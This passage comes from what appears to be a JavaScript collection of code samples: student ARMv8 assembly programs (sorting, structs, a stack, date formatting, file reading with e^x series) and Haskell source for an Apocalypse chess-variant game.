			mov offset_r, 0			//Setting the initial offset to 0
			str i_s, [x29,16]		//Storing value of i to stack
			str j_s, [x29, 20]		//Storing value of j to stack
			str v_s, [x29, base_r]		//Storing first value of array to base address
			mov w25, 0x00000005		//Initializing arbitrary value
			mov w24, 0x7FFFFFFF		//Initializing arbitrary value
			add offset_r, offset_r, base_r	//Setting the offset to point to base address
		tloop1:	tst w25, w25, lsl 2		//Doing bitwise operations on w25 --> Used in creating random integers
			lsr w24, w24, 6			//Scrambling bits
			mov w26, w24			//Moving value
			adc w25, w25, w25		//Carrying w25 over by bit
			eor w26, w26, w24, lsl 12	//Exclusive or with a shift
			eor w24, w26, w26, lsl 2	//Exclusive or with a shift
			ldr v_s, [x29, offset_r]	//Loading into array
			and v_s, w26, 0xFF		//Doing AND with 0xFF to finalize random int
			str v_s, [x29, offset_r]	//Storing this value into the array within the stack
			ldr i_s, [x29, 16]		//Loading i from stack
			ldr v_s, [x29, offset_r]	//Loading array element from stack
			adrp x0, fmt			//Loading string to be printed
			add x0, x0, :lo12:fmt		//Loading low order bits of string
			mov w1, i_s			//Preparing variable to be printed
			mov w2, v_s			//Preparing variable to be printed
			bl printf			//Calling printf function
			str v_s, [x29, offset_r]	//Storing element back into array
			add offset_r, offset_r, 4	//Incrementing the offset to point to next index
			add i_s, i_s, 1			//Incrementing i
			str i_s, [x29, 16]		//Storing value of i
			cmp i_s, 40			//Comparing i to the size of the array
			b.lt tloop1			//If less than, branch back to the top of loop to fill the array
		bloop1:	ldr i_s, [x29, 16]		//Loading value of i
			mov i_s, 40			//Declaring i to be 40
			add i_s, i_s, -1		//Declaring i to be 39
			str i_s, [x29, 16]		//Storing value of i
			ldr j_s, [x29, 20]		//Loading value of j
			mov j_s, 1			//Declaring j to be 1
			str j_s, [x29, 20]		//Storing value of j
		tloop2:	mov offset_r, 0			//Setting offset to 0
			add offset_r, base_r, offset_r	//Incrementing offset to point to base address
		tloop3:	ldr v_s, [x29,offset_r]		//Loading element of array at offset
			add offset_r, offset_r, 4	//Incrementing offset by 4 to point to next element
			ldr temp_r, [x29, offset_r]	//Loading the element at offset into temp
			str temp_r, [x29, offset_r]	//Storing temp at offset
			add offset_r, offset_r, -4	//Decrementing offset by 4
			str v_s, [x29, offset_r]	//Storing element of array at offset
			cmp v_s, temp_r			//Comparing two elements
			b.gt if1			//If greater than, go back to swap elements
			b el1				//Else, carry on
		if1:	ldr temp_r, [x29, offset_r]	//Loading element at offset into temp
			add offset_r, offset_r, 4	//Incrementing offset by 4
			ldr v_s, [x29, offset_r]	//Loading element at offset into array
			str temp_r, [x29, offset_r]	//Storing temp into offset
			add offset_r, offset_r, -4	//Decrementing offset by 4
			str v_s, [x29, offset_r]	//Storing element of array into offset
			add offset_r, offset_r, 4	//Incrementing offset for next iteration
			ldr i_s, [x29, 16]		//Loading value of i
			ldr j_s, [x29, 20]		//Loading value of j
		el1:	add j_s, j_s, 1			//Incrementing j
			str j_s, [x29, 20]		//Storing value of j
			cmp j_s, i_s			//Comparing j to i
			b.le tloop3			//Branching back to top of loop
			add i_s, i_s, -1		//Decrementing i
			str i_s, [x29, 16]		//Storing value of i
			cmp i_s, 0			//Comparing i to 0
			b.ge tloop3			//Branching back to loop after decrement
			mov i_s, 0			//Setting i to 0
			str i_s, [x29, 16]		//Storing value of i
		printe:	adrp x0, fmt1			//Preparing to print string
			add x0, x0, :lo12:fmt1		//Loading low order bits of string
			bl printf			//Calling printf
			mov offset_r, 0			//Setting offset to 0
			add offset_r, offset_r, base_r	//Setting offset to base address
		printl:	adrp x0, fmt2			//Preparing to print string
			add x0, x0, :lo12:fmt2		//Loading low order bits of string
			ldr i_s, [x29, 16]		//Loading value of i
			ldr v_s, [x29, offset_r]	//Loading element of array at offset
			mov w1, i_s			//Preparing to print variable
			mov w2, v_s			//Preparing to print element of array
			bl printf			//Calling printf
			str v_s, [x29, offset_r]	//Storing element of array
			add offset_r, offset_r, 4	//Incrementing offset by 4
			add i_s, i_s, 1			//Incrementing i by 1
			str i_s, [x29, 16]		//Storing value of i
			cmp i_s, 40			//Comparing i to size
			b.lt printl			//Branching to print from the loop
		end:	ldp x29, x30, [sp], dealloc	//Deallocating memory
			ret				//Return and end function`
	},
	m19: {
		type: 'arm',
		code: `
		false = 0
		true = 1
		f_s = 16
		s_s = 32
		first_x_offset = 0
		first_y_offset = 4
		first_z_offset = 8
		first_r_offset = 12
		second_x_offset = 0
		second_y_offset = 4
		second_z_offset = 8
		second_r_offset = 12

		sphere_struct_size = 16

		fmt:	.string "\nInitial sphere values:\n"
		f_m:	.string "first"
		s_m:	.string "second"
		fmt1:	.string "\nChanged sphere values:\n"
		f_m1:	.string "first"
		s_m1:	.string "second"
		fmt2:	.string "Sphere %s origin = (%d, %d, %d) radius = %d\n"

		alloc = -(16 + 2*sphere_struct_size) & -16
		.balign 4
		.global main
		main:	stp x29, x30, [sp, alloc]!
			mov x29, sp
		break1:	add x8, x29, 16
			bl newSphere
			ldr w0, [x8, first_x_offset]
			str w0, [sp, first_x_offset]
			str w0, [sp, second_x_offset]
			ldr w0, [x8, first_y_offset]
			str w0, [sp, first_y_offset]
			str w0, [sp, second_y_offset]
			ldr w0, [x8, first_z_offset]
			str w0, [sp, first_z_offset]
			str w0, [sp, second_z_offset]
			ldr w0, [x8, first_r_offset]
			str w0, [sp, first_r_offset]
			str w0, [sp, second_r_offset]
			adrp x0, fmt
			add x0, x0, :lo12:fmt
			bl printf
			add x0, x29, 16
			adrp x19, f_m
			add x19, x19, :lo12:f_m
			bl printSphere
			adrp x19, s_m
			add x19, x19, :lo12:s_m
			add x0, x29, 32
			bl printSphere
			bl equal
			cmp x0, true
			b.eq ifm
			b next
		ifm:	add x0, x29, 16
			mov x1, -5
			mov x2, 3
			mov x3, 2
			bl move
			add x0, x29, 32
			mov x1, 8
			bl expand
		next:	adrp x0, fmt1
			add x0, x0, :lo12:fmt1
			bl printf
			adrp x19, f_m
			add x19, x19, :lo12:f_m
			add x0, x29, 16
			bl printSphere
			adrp x19, s_m
			add x19, x19, :lo12:s_m
			add x0, x29, 32
			bl printSphere
			ldp x29, x30, [sp], -alloc
			ret

		sphere_alloc = -(16 + sphere_struct_size) & -16
		newSphere:
			stp x29, x30, [sp, sphere_alloc]!
			mov x29, sp
			mov w0, 0
			str w0, [x29, 16 + first_x_offset]
			mov w0, 0
			str w0, [x29, 16 + first_y_offset]
			mov w0, 0
			str w0, [x29, 16 + first_z_offset]
			mov w0, 1
			str w0, [x29, 16 + first_r_offset]

			ldr w0, [x29, 16 + first_x_offset]
			str w0, [x8, first_x_offset]
			ldr w0, [x29, 16 + first_y_offset]
			str w0, [x8, first_y_offset]
			ldr w0, [x29, 16 + first_z_offset]
			str w0, [x8, first_z_offset]
			ldr w0, [x29, 16 + first_r_offset]
			str w0, [x8, first_r_offset]
			ldp x29, x30, [sp], -sphere_alloc
			ret

		move:	stp x29, x30, [sp, -16]!
			mov x29, sp
			mov x10, x0
			mov w11, w1
			mov w12, w2
			mov w13, w3
			ldr w14, [sp, x10]
			add w14, w14, w11
			str w14, [sp, x10]
			add x10, x10, 4
			ldr w14, [sp, x10]
			add w14, w14, w12
			str w14, [sp, x10]
			add x10, x10, 4
			ldr w14, [sp, x10]
			add w14, w14, w13
			str w14, [sp, x10]
			ldp x29, x30, [sp], 16
			ret

		expand:	stp x29, x30, [sp, -16]!
			mov x29, sp
			mov w10, w0
			mov w11, w1
			add w10, w10, 12
			ldr w12, [sp, x10]
			mul w12, w12, w11
			str w12, [sp, x10]
			ldp x29, x30, [sp], 16
			ret


		printSphere:
			stp x29, x30, [sp, -16]!
			mov x29, sp
			mov x1, x19
			ldr w2, [x0, first_x_offset]
			ldr w3, [x0, first_y_offset]
			ldr w4, [x0, first_z_offset]
			ldr w5, [x0, first_r_offset]

			adrp x0, fmt2
			add x0, x0, :lo12:fmt2
			bl printf
			ldp x29, x30, [sp], 16
			ret

		equal:	stp x29, x30, [sp, -16]!
			mov x29, sp
			mov x0, false
			ldr w13, [x29, 16 + first_x_offset]
			ldr w14, [x29, 32 + second_x_offset]
			cmp w13, w14
			b.ne else
			ldr w13, [x29, 16 + first_y_offset]
			ldr w14, [x29, 32 + second_y_offset]
			cmp w13, w14
			b.ne else
			ldr w13, [x29, 16 + first_z_offset]
			ldr w14, [x29, 32 + second_z_offset]
			cmp w13, w14
			b.ne else
			ldr w13, [x29, 16 + first_r_offset]
			ldr w14, [x29, 32 + second_r_offset]
			cmp w13, w14
			mov x0, true
		else:
			ldp x29, x30, [sp], 16
			ret`
	},
	m20: {
		type: 'arm',
		code: `
		//Created by Joshua Dow, 10150588, 11/24/2016.

		stacksize = 5								//Declaring stack size
		FALSE = 0								//Declaring false
		TRUE = 1								//Declaring true
		define(i_s, w21)							//M4 macro for w21
		i_s = 4									//Declaring i_s to 4
			.data								//Beginning of data section
			.global s_m							//Making variable global
			.global t_m							//Making variable global
		s_m:	.skip stacksize * 4						//Stack is the size of stacksize * 4
		t_m:	.word -1							//Top of stack is a word and is initialized to -1

			.text								//Beginning of text section
		fmt:	.string "\nStack overflow! Cannot push value onto stack.\n"	//String
		fmt1:	.string "\nStack underflow! Cannot pop an empty stack. \n"	//String
		fmt2:	.string "\nEmpty stack\n"					//String
		fmt3:	.string "\nCurrent stack contents: \n"				//String
		fmt4:	.string "	%d"						//String
		fmt5:	.string "<-- top of stack"					//String
		fmt6:	.string "\n"							//String
			.balign 4							//Word aligning instructions
			.global push							//Making push global
		push:
			stp x29, x30, [sp, -16]!					//Storing pair
			mov x29, sp							//Moving sp to fp
			mov w9, w0							//Storing input in a register
			bl stackFull							//Branch to subroutine
			cmp w0, TRUE							//Compare return value to true
			b.ne ep								//If not equal branch to else statement
			adrp x0, fmt							//Load high order bits of fmt
			add x0, x0, :lo12:fmt						//Load low order bits of fmt
			bl printf							//Call printf

		ep:
			adrp x10, t_m							//Load high order bits of the address of top
			add x10, x10, :lo12:t_m						//Load low order bits of the address of top
			ldr w11, [x10]							//Store value of top into w11
			add w11, w11, 1							//Increment w11 by 1
			str w11, [x10]							//Store new value of w11

			adrp x12, s_m							//Load high order bits of the address of the stack
			add x12, x12, :lo12:s_m						//Load low order bits of the address of the stack
			str w9, [x12, w11, SXTW 2]					//Logical shift left by 2, then store value into w9
			ldp x29, x30, [sp], 16						//Restore pair of registers
			ret								//Return to calling code

		.global pop								//Makes pop global function
		pop:
			stp  x29, x30, [sp, -16]!					//Store pair of registers
			mov x29, sp							//Moving sp to fp
			mov w9, 0							//Initialize popped value to zero
			bl stackEmpty							//Check if stack is empty
			cmp w0, TRUE							//Compare result to true
			b.ne ep1							//If false, branch to else statement
			adrp x0, fmt1							//Load high order bits of fmt1
			add x0, x0, :lo12:fmt1						//Load low order bits of fmt1
			bl printf							//Call printf
			mov x0, -1							//Set return value to -1
			ldp x29, x30, [sp], 16						//Restore pair of registers
			ret								//Return to calling code
		ep1:
			adrp x10, t_m							//Load high order bits of the address of top
			add x10, x10, :lo12:t_m						//Load low order bits of the address of top
			adrp x11, s_m							//Load high order bits of the address of the stack
			add x11, x11, :lo12:s_m						//Load low order bits of the address of the stack
			ldr w12, [x10]							//Load value of index into w12
			ldr w9, [x11, w12, SXTW 2]					//Find value in stack according to index
			add w12, w12, -1						//Decrement index
			str w12, [x10]							//Store new value into address of top
			mov w0, w9							//Move value to be returned
			ldp x29, x30, [sp], 16						//Restore pair of register
			ret								//Return to calling code

		.global stackFull							//Make stackFull global
		stackFull:
			stp x29, x30, [sp, -16]!					//Store pair of registers
			mov x29, sp							//Moving sp to fp
			adrp x10, t_m							//Load high order bits of the address of top
			add x10, x10, :lo12:t_m						//Load low order bits of the address of top
			ldr w11, [x10]							//Load value of top into w11
			mov w12, stacksize						//Move value of stacksize into w12
			add w12, w12, -1						//Decrement w12 by -1
			cmp w11, w12							//Compare w11 to w12
			b.ne eps							//If not equal, branch to else
			mov x0, TRUE							//Move return value to TRUE
			ldp x29, x30, [sp], 16						//Restore pair of registers
			ret								//Return to calling code
		eps:
			mov x0, FALSE							//Move return value to FALSE
			ldp x29, x30, [sp], 16						//Restore pair of registers
			ret								//Return to calling code

		.global stackEmpty							//Make stackEmpty global
		stackEmpty:
			stp x29, x30, [sp, -16]!					//Store pair of registers
			mov x29, sp							//Move sp to fp
			adrp x10, t_m							//Load high order bits of top
			add x10, x10, :lo12:t_m						//Load low order bits of top
			ldr x11, [x10]							//Load value of top into w11
			cmp x11, -1							//Compare top to -1
			b.ne epse							//If not equal, branch to else
			mov x0, TRUE							//Set return value to true
			ldp x29, x30, [sp], 16						//Restore pair of registers
			ret								//Return to calling code
		epse:
			mov x0, FALSE							//Set return value to false
			ldp x29, x30, [sp], 16						//Restore pair of registers
			ret								//Return to calling code

		.global display								//Make display global
		display:
			stp x29, x30, [sp, -16]!					//Store pair of registers
			mov x29, sp							//Move sp to fp
			mov w14, 0							//Initialize local variable to 0
			adrp x10, t_m							//Load high order bits of top
			add x10, x10, :lo12:t_m						//Load low order bits of top
			ldr w14, [x10]							//Set local variable to value of top
			bl stackEmpty							//Check if stack empty
			cmp x0, TRUE							//Compare returned value to true
			b.ne eld							//If not equal, branch to else
			adrp x0, fmt2							//Load high order bits of fmt2
			add x0, x0, :lo12:fmt2						//Load low order bits of fmt2
			bl printf							//Call to printf
		eld:
			adrp x0, fmt3							//Load high order bits of fmt3
			add x0, x0, :lo12:fmt3						//Load low order bits of fmt3
			bl printf							//Call to printf
		ind:	adrp x10, t_m							//Load high order bits of top
			add x10, x10, :lo12:t_m						//Load low order bits of top
			ldr w19, [x10]							//Load value of top into w19
		top_loop:
			adrp x0, fmt4							//Load high order bits of ftm4
			add x0, x0, :lo12:fmt4						//Load low order bits of fmt4
			adrp x13, s_m							//Load high order bits of the address of the stack
			add x13, x13, :lo12:s_m						//Load low order bits of the address of the stack
			ldr w1, [x13, w19, SXTW 2]					//Load value inside stack at index
			bl printf							//Call to printf
			cmp w19, w14							//Compare index to top
			b.ne sk								//If not equal, branch to sk
			adrp x0, fmt5							//Load high order bits of fmt5
			add x0, x0, :lo12:fmt5						//Load low order bits of fmt5
			bl printf							//Call to printf
		sk:
			adrp x0, fmt6							//Load high order bits of fmt6
			add x0, x0, :lo12:fmt6						//Load low order bits of fmt6
			bl printf							//Call to printf
			sub w19, w19, 1							//Decrement index by 1
			str w19, [x10]							//Store value of index back into top
			cmp w19, 0							//Compare top to 0
			b.ge top_loop 							//If >=, branch to top_loop
			ldp x29, x30, [sp], 16						//Restore pair of registers
			ret								//Return to calling code`
	},
	m21: {
		type: 'arm',
		code: `
		define(i_r, w19)
		define(argc_r, w20)
		define(argv_r, x21)
		define(mon_r, w22)
		define(day_r, w23)
		define(year_r, w24)
		jan_m:	.string "January"
		feb_m:	.string "February"
		mar_m:	.string "March"
		apr_m:	.string	"April"
		may_m:	.string "May"
		jun_m:	.string "June"
		jul_m:	.string "July"
		aug_m:	.string "August"
		sep_m:	.string "September"
		oct_m:	.string "October"
		nov_m:	.string "November"
		dec_m:	.string "December"

		errm:	.string "Invalid Month.\n"
		errd:	.string "Invalid Day.\n"
		erry:	.string "Invalid Year.\n"
		fmt:	.string "%s %dst %d\n"
		fmt1:	.string "%s %dnd %d\n"
		fmt2:	.string "%s %drd %d\n"
		fmt3:	.string "%s %dth %d\n"
			.data
			.balign 8
		mon_m:	.dword jan_m, feb_m, mar_m, apr_m, may_m, jun_m, jul_m, aug_m, sep_m, oct_m, nov_m, dec_m

			.text
			.balign 4
			.global main
		main:
			stp x29, x30, [sp, -16]!
			mov x29, sp

			mov argc_r, w0
			mov argv_r, x1
			mov i_r, 1

			ldr x0, [argv_r, i_r, SXTW 3]
			bl atoi
			mov mon_r, w0
			cmp mon_r, 12
			b.gt erm
			cmp mon_r, 0
			b.le erm
			sub mon_r, mon_r, 1

			add i_r, i_r, 1
			ldr x0, [argv_r, i_r, SXTW 3]
			bl atoi
			mov day_r, w0
			cmp day_r, 31
			b.gt erd
			cmp day_r, 0
			b.le erd

			add i_r, i_r, 1
			ldr x0, [argv_r, i_r, SXTW 3]
			bl atoi
			mov year_r, w0
			cmp year_r, 0
			b.lt ery

			adrp x26, mon_m
			add x26, x26, :lo12:mon_m
		c1:	cmp day_r, 1
			b.ne c2
			adrp x0, fmt
			add x0, x0, :lo12:fmt
			b print

		c2:	cmp day_r, 2
			b.ne c3
			adrp x0, fmt1
			add x0, x0, :lo12:fmt1
			b print
		c3:
			cmp day_r, 3
			b.ne c4
			adrp x0, fmt2
			add x0, x0, :lo12:fmt2
			b print
		c4:
			cmp day_r, 21
			b.ne c5
			adrp x0, fmt
			add x0, x0, :lo12:fmt
			b print
		c5:
			cmp day_r, 22
			b.ne c6
			adrp x0, fmt1
			add x0, x0, :lo12:fmt1
			b print
		c6:
			cmp day_r, 23
			b.ne c7
			adrp x0, fmt2
			add x0, x0, :lo12:fmt2
			b print
		c7:
			cmp day_r, 31
			b.ne c8
			adrp x0, fmt
			add x0, x0, :lo12:fmt
			b print
		c8:
			adrp x0, fmt3
			add x0, x0, :lo12:fmt3
			b print 
		print:	ldr x1, [x26, mon_r, SXTW 3]
			mov w2, day_r
			mov w3, year_r
			bl printf
			ldp x29, x30, [sp], 16
			ret

		erm:
			adrp x0, errm
			add x0, x0, :lo12:errm
			bl printf
			ldp x29, x30, [sp], 16
			ret
		erd:
			adrp x0, errd
			add x0, x0, :lo12:errd
			bl printf
			ldp x29, x30, [sp], 16
			ret
		ery:
			adrp x0, erry
			add x0, x0, :lo12:erry
			bl printf
			ldp x29, x30, [sp], 16
			ret`
	},
	m22: {
		type: 'arm',
		code: `
		//Created by Joshua Dow, 10150588

		define(fd_r, w19)
		define(nread_r, x20)
		define(buf_base_r, x21)
		define(argv_r, x23)									//Declaring m4 macros
		define(in_r, x24)
		define(i_r, w26)
		buf_size = 8
		alloc = -(16 + buf_size) & -16
		dealloc = -alloc
		buf_s = 16
		AT_FDCWD = -100

		fmt1:	.string "Error opening file: %s\nAborting.\n"
		fmt2:	.string "x				e^x				e^-x\n"
		fmt3:	.string "%9.10f			%9.10f			%9.10f\n"			//Declaring format strings
		secon: 	.double 0r1.0e-10

			.balign 4										//Aligning bits
			.global main										//Declaring main global
		main:
			stp x29, x30, [sp, alloc]!								//Storing pair of register
			mov x29, sp										//Point fp at sp

			mov argv_r, x1										//Get input
			mov i_r, 1										//Index of input file name

			mov w0, AT_FDCWD									//Openat request
			ldr x1, [argv_r, i_r, SXTW 3]								//Getting filename
			mov w2, 0										//Unused
			mov w3, 0										//Unused
			mov x8, 56										//Openat
		 	svc 0											//System call
			mov fd_r, w0										//Store file descriptor

			cmp fd_r, 0										//Compare file descriptor to 0
			b.ge sopen										//If larger, go to open file
			adrp x0, fmt1										//Loading error message
			add x0, x0, :lo12:fmt1									//Loading low order bits of error message
			ldr x1, [argv_r, i_r, SXTW 3]								//Load file name
			bl printf										//Printf
			mov w0, -1										//Set up parameters to exit
			b exit											//branch to exit

		sopen:
			add buf_base_r, x29, buf_s								//Start at beginning of buffer base
			adrp x0, fmt2										//Load high order bits
			add x0, x0, :lo12:fmt2									//Load low order bits
			bl printf										//Printf
			fmov d14, 1.0										//Initializing
			fmov d31, 1.0										//Initializing
			fmov d16, 1.0										//Initializing
			mov x25, 1										//Start count
			adrp x22, secon										//High order bits of double
			add x22, x22, :lo12:secon								//Low order bits of double
			ldr d15, [x22]										//Load the value
			mov x26, 0										//Initializing
			fmov d13, 1.0										//Initializing
			fmov d11, 1.0										//Initializing
		top:
			mov w0, fd_r										//Set up 1st arg
			mov x1, buf_base_r									//Set up 2nd arg
			mov x2, buf_size									//Set up 3rd arg
			mov x8, 63										//Call to read
			svc 0											//System call
			mov nread_r, x0										//Record number of bits read
			cmp nread_r, buf_size									//Compare to buffer size
		 	b.ne end										//If less, means we have reached end of file

			ldr d8, [buf_base_r]									//Value read from file
			fmov d9, d8										//Move into temp d register
			cmp x26, 0										//Used to alternate between + and -
			b.eq subloop										//Branch
			cmp x26, 1										//Used to alternate between + and -
			b.eq subloop2										//Branch

		subloop:
			fmov d20, 1.0										//Setting up counter
			fmov d21, 1.0										//Setting up counter
			fmov d22, xzr										//Setting up comparison
		pow1:
			fcmp d9, d22										//Compare value read to 0 (first read), skip
			b.eq skip1										//branch to skip
			fmul d9, d9, d9										//Square number
			fadd d20, d20, d21									//Add 1 to count
			fcmp d20, d16										//Compare count to total count
			b.le pow1										//Loop back to pow
		skip1:
			fadd d16, d16, d21 									//Add 1 to total count
			fdiv d12, d9, d14									//Divide x by some factorial
			fadd d13, d13, d12									//Add value to e
			fsub d11, d11, d12									//Add value to -e
			fmul d14, d14, d14									//Increment factorial
			fcmp d14, d31										//Compare factorial to 1
			fadd d14, d14, d31									//If is one, add 1 to it
			add x25, x25, 1										//Add 1 to count
			mov x26, 1										//Used to alternate between + and -
			adrp x0, fmt3										//High order bits of string
			add x0, x0, :lo12:fmt3									//Low order bits of string
			fmov d0, d8										//1st arg (x)
			fmov d1, d13										//2nd arg (e)
			fmov d2, d11										//3rd arg (-e)
			bl printf										//Printf
			b top											//Loop back to top
		subloop2:
			fmov d20, 1.0										//Setting up counter
			fmov d21, 1.0										//Setting up counter
			fmov d22, xzr										//Setting up comparison
		pow2:
			fcmp d9, d22										//Compare value read to 0
			b.eq skip2										//If 0, skip
			fmul d9, d9, d9										//Square number
			fadd d20, d20, d21									//Add 1 to count
			fcmp d20, d16										//Compare to total count
			b.le pow2										//loop back to pow
		skip2:
			fadd d16, d16, d21									//Add one to total count
			fdiv d12, d9, d14									//Divide x by some factorial
			fadd d13, d13, d12									//Add value to e
			fadd d11, d11, d12									//Add value to -e
			fmul d14, d14, d14									//Increment factorial
			add x25, x25, 1										//Add 1 to count
			mov x26, 0										//Used to alternate between + and -
			adrp x0, fmt3										//High order bits of string
			add x0, x0, :lo12:fmt3									//Low order bits of string
			fmov d0, d8										//1st arg (x)
			fmov d1, d13										//2nd arg (e)
			fmov d2, d11										//3rd arg (-e)
			bl printf										//Printf
			b top											//Loop back to top

		end:
			mov w0, fd_r										//1st arg file descriptor
			mov x8, 57										//Close request
			svc 0											//System call

			mov w0, 0										//Return 0
		exit:
			ldp x29, x30, [sp], dealloc								//Load pair of registers
			ret											//Return`
	},
	hs1: {
		type: 'haskell',
		code: `
		module Main (
	      -- * Main
	      main, main'
	      ) where

		import Data.Maybe (fromJust, isNothing)
		import System.Environment
		import System.IO.Unsafe
		import ApocTools
		import ApocStrategyHumanSol
		import StrategyUtils
		import Rules
		import Moves
		import EndGame
		import Upgrade

		---Main-------------------------------------------------------------

		-- | The main entry, which just calls 'main'' with the command line arguments.
		main = main' (unsafePerformIO getArgs)

		{- | We have a main' IO function so that we can either:

		     1. call our program from GHCi in the usual way
		     2. run from the command line by calling this function with the value from (getArgs)
		-}
		main'           :: [String] -> IO()
		main' args = do
		  if length args == 0 then do
		      showStrategies
		      strat1 <- getStrategyForPlayer "BLACK"
		      strat2 <- getStrategyForPlayer "WHITE"
		      
		      if stratsValid strat1 strat2 == False then do
		        showStrategies
		      else do
		        play strat1 strat2

		  else do
		    let strat1 = args!!0
		    let strat2 = args!!1

		    if stratsValid strat1 strat2 == False then do
		      showStrategies
		    else do
		      play strat1 strat2

		  return ()

		-- | Given a Played and current penalties for the player, returns the new amount of penalties
		checkPenalty :: Played -> Int -> Int
		checkPenalty (Goofed (_)) penalties = penalties + 1
		checkPenalty _ penalties = penalties

		-- | If the second passed in GameState is not None, returns it, otherwise returns the first state
		getRecentState :: Maybe GameState -> Maybe GameState -> IO GameState
		getRecentState oldstate newstate = do
		  if newstate /= Nothing then do
		    return (fromJust newstate)
		  else do
		    return (fromJust oldstate)


		-- | Main Recursive Game Loop
		gameLoop :: Chooser -> Chooser -> GameState -> IO()
		gameLoop blackstrat whitestrat state = do

		  -- Get the move for black
		  blackInputMove <- blackstrat state Normal Black

		  let blackPenalties = blackPen state
		  let blackMove = parseNormalMove Black blackInputMove state

		  -- Get the move for white
		  whiteInputMove <- whitestrat state Normal White

		  let whitePenalties = whitePen state
		  let whiteMove = parseNormalMove White whiteInputMove state

		  let movedState = move (state {blackPlay = blackMove, blackPen = checkPenalty blackMove blackPenalties, whitePlay = whiteMove, whitePen = checkPenalty whiteMove whitePenalties})

		  print movedState

		  -- Check if we need to upgrade stuff
		  upgradeState <- upgrade movedState blackstrat whitestrat

		  if (upgradeState /= Nothing) then do
		    -- Print the upgraded state
		    print $ fromJust upgradeState
		  else do
		    return () -- ty haskell

		  recentState <- getRecentState (Just movedState) (upgradeState)

		  let isEndGame = isOver recentState

		  if isEndGame == Nothing then
		    gameLoop blackstrat whitestrat recentState
		  else
		    putStrLn (fromJust isEndGame)

		  return ()

		-- | Starts playing the two strategies (THEY MUST BE ALREADY VALID)
		play :: String -> String -> IO()
		play x y = do
		  let strat1 = getStrategyFromString x
		  let strat2 = getStrategyFromString y

		  print initBoard
		  
		  gameLoop strat1 strat2 initBoard`
	},
	hs2: {
		type: 'haskell',
		code: `
		module ApocStrategyHumanSol where
		import Data.Maybe (fromJust, isNothing)
		--import Data.List ((\\))
		import Data.Foldable(find)
		import Text.Read(readMaybe)
		import ApocTools

		-- | Human entry point
		human                   :: Chooser
		human board Normal player =
		    do move <- readNPairs 2
		                          ("Enter the move coordinates for player "
		                           ++ (show player)
		                           ++ " in the form 'srcX srcY destX destY'\\n"
		                           ++ "[0 >= n >= 4, or just enter return for a 'pass'] "
		                           ++ (if player==White then "W" else "B")
		                           ++ "2:\\n")
		                          (\\x -> x>=0 && x<=4)
		       return move
		human board PawnPlacement player =
		    do move <- readNPairs 1
		                          ("Enter the coordinates to place the pawn for player "
		                           ++ (show player)
		                           ++ " in the form 'destX destY':\\n"
		                           ++ "[0 >= n >= 4] "
		                           ++ (if player==White then "W" else "B")
		                           ++ "1:\\n")
		                          (\\x -> x>=0 && x<=4)
		       return move

		-- | Converts a given list to a list of tuple pairs
		list2pairs            :: [a] -> [(a,a)]
		list2pairs []         = []
		list2pairs (x0:x1:xs) = (x0,x1):list2pairs xs

		{- | Reads a pair of pairs from standard input in the form "int1 int2 int3 int4".  If user
		     just types a return, Nothing is returned, otherwise if the user types other than
		     4 well-formed integers, then a subsequent attempt is done until we get correct
		     input.
		-}
		readNPairs        :: Int -> String -> (Int->Bool)-> IO (Maybe [(Int,Int)])
		readNPairs n prompt f =
		    do putStrLn prompt
		       line <- getLine
		       putStrLn line
		       let lst = words line
		        in if length lst == 0
		           then return Nothing
		           else
		             if length lst < (2*n)
		             then do putStrLn $ "Bad input! (" ++ line ++ ") \\nPlease enter "
		                                ++ show (n*2) ++ " integers in the form '"
		                                ++ (foldl (++) " " [show i++" "|i<-[1..n*2]]) ++ "'" -- count up to n
		                     readNPairs n prompt f
		             else case readInts (n*2) lst f of
		                     Nothing   -> do putStrLn $ "Bad input: one or more integers is manformed! ("
		                                              ++ line ++ ") \\nPlease enter "
		                                              ++ show (n*2) ++ " integers in the form '"
		                                              ++ (foldl (++) " " [show i++" "|i<-[1..n*2]]) ++ "'" -- count up to n
		                                     readNPairs n prompt f
		                     Just x    -> return $ Just $ list2pairs x


		{- | Converts a list of Strings into a list of Ints that obey constraint f.
		     If one or more of the strings does not parse into an Int, or if it fails constraint
		     f, then return Nothing.
		-}
		readInts :: Int -> [String] -> (Int->Bool) -> Maybe [Int]
		readInts n xs f = let ints = take n $ map (readMaybe :: String -> Maybe Int) xs -- convert each from String to Int
		                                                                                -- setting each to Nothing if failure
		                   in if find (isNothing) ints == Nothing -- check all reads were successful
		                      then let ints2 = (map (fromJust) ints) -- strip the "Just" from each element
		                            in if find (==False) (map f ints2) == Nothing -- check constraint
		                               then Just ints2 -- success
		                               else Nothing    -- failure (constraint f)
		                      else Nothing             -- failure (int conversion)`
	},
	hs3: {
		type: 'haskell',
		code: `
		module ApocTools (
	    -- * Cell (A "square" on the board)
	    Cell(WK,WP,BK,BP,E),
	    cell2Char,
	    char2Cell,
	    putCell,
	    -- * The board itself
	    Board,
	    initBoard,
	    putBoard,
	    board2Str,
	    getFromBoard,
	    -- * Players and pieces
	    Player(Black,White),
	    Piece(BlackKnight,BlackPawn,WhiteKnight,WhitePawn),
	    pieceOf,
	    playerOf,
	    -- * Move descriptions
	    Played(Played,Passed,Goofed,{-GoofedFromOther,GoofedFromInvalid,GoofedFromEmpty,-}Init,UpgradedPawn2Knight,PlacedPawn,BadPlacedPawn,NullPlacedPawn,None),
	    PlayType(Normal,PawnPlacement),
	    -- * The game state
	    GameState(GameState,blackPlay,blackPen,whitePlay,whitePen,theBoard),
	    -- * The interface for a strategy
	    Chooser

	    ) where
		import Data.Char (isSpace)

		---Cells-----------------------------------------------------------
		---Cells are the state of a cell: contains White and Black Pawns and Knights or is Empty

		{- | The possible contents of a cell: 'WK', 'BK', 'WP', 'BP', and Empty ('E').
		     We do NOT include "deriving (Show)" here because we use the "instance Show ..."
		     so we can customize it's display from (say) "Cell E" to "_" according to the
		     'cell2Char' function.
		-}
		data Cell = WK   -- ^ White knight
		          | WP   -- ^ White pawn
		          | BK   -- ^ Black knight
		          | BP   -- ^ Black pawn
		          | E   -- ^ Empty
		          deriving (Eq) --deriving (Show)

		-- | Customized print form of Cell
		instance {-# OVERLAPS #-}
		         Show (Cell) where
		         show c = [cell2Char c]

		-- | Converts a 'Cell' to a displayable Char
		cell2Char       :: Cell -> Char
		cell2Char WK    =  'X'
		cell2Char WP    =  '/'
		cell2Char BK    =  '#'
		cell2Char BP    =  '+'
		cell2Char E     =  '_'

		-- | Converts a 'Char' to a 'Cell'
		char2Cell       :: Char -> Cell
		char2Cell 'X'   = WK
		char2Cell '/'   = WP
		char2Cell '#'   = BK
		char2Cell '+'   = BP
